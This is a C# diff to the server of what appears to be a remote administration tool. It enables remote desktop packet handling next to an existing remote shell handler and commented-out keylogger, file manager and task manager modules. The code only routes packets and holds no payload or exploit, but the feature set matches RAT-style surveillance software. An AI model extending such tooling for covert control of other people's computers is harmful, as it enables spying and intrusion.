@@ -3,7 +3,7 @@ using Server.Networking.Handlers;
 using Server.Networking.Packets.ClientServices;
 //using Server.Networking.Packets.FileManager;
 //using Server.Networking.Packets.Keylogger;
-//using Server.Networking.Packets.RemoteDesktop;
+using Server.Networking.Packets.RemoteDesktop;
 using Server.Networking.Packets.RemoteShell;
 using Server.Networking.Packets.SystemInfo;
 //using Server.Networking.Packets.TaskManager;
@@ -20,7 +20,7 @@ namespace Server.Networking
         //public TaskManagerHandler TaskManagerHandler { get; private set; }
         //public FileManagerHandler FileManagerHandler { get; private set; }
         //public KeyloggerHandler KeyloggerHandler { get; private set; }
-        //public RemoteDesktopHandler RemoteDesktopHandler { get; private set; }
+        public RemoteDesktopHandler RemoteDesktopHandler { get; private set; }
 
         public ClientHandler(Client client)
         {
@@ -33,7 +33,7 @@ namespace Server.Networking
             SystemInformationHandler = new(_client);
             RemoteShellHandler = new(_client);
             //TaskManagerHandler = new(_client);
-            //RemoteDesktopHandler = new(_client);
+            RemoteDesktopHandler = new(_client);
             //FileManagerHandler = new(_client);
             //KeyloggerHandler = new(_client);
         }
@@ -105,13 +105,13 @@ namespace Server.Networking
                     //case 0x60:
                     //    KeyloggerHandler.Handler(ResponsePacket.Deserialize<GetKeyloggerLogsDirectory>(data));
                     //    break;
-                    //// Remote Desktop
-                    //case 0x70:
-                    //    RemoteDesktopHandler.Handler(ResponsePacket.Deserialize<GetDesktopPacket>(data));
-                    //    break;
-                    //case 0x71:
-                    //    RemoteDesktopHandler.Handler(ResponsePacket.Deserialize<GetMonitorsPacket>(data));
-                    //    break;
+                    // Remote Desktop
+                    case 0x70:
+                        RemoteDesktopHandler.Handler(ResponsePacket.Deserialize<GetDesktopPacket>(data));
+                        break;
+                    case 0x71:
+                        RemoteDesktopHandler.Handler(ResponsePacket.Deserialize<GetMonitorsPacket>(data));
+                        break;
                     default:
                         break;
                 }
@@ -130,7 +130,7 @@ namespace Server.Networking
             //TaskManagerHandler?.Dispose();
             //FileManagerHandler?.Dispose();
             //KeyloggerHandler?.Dispose();
-            //RemoteDesktopHandler?.Dispose();
+            RemoteDesktopHandler?.Dispose();
 
             GC.SuppressFinalize(this);
         }
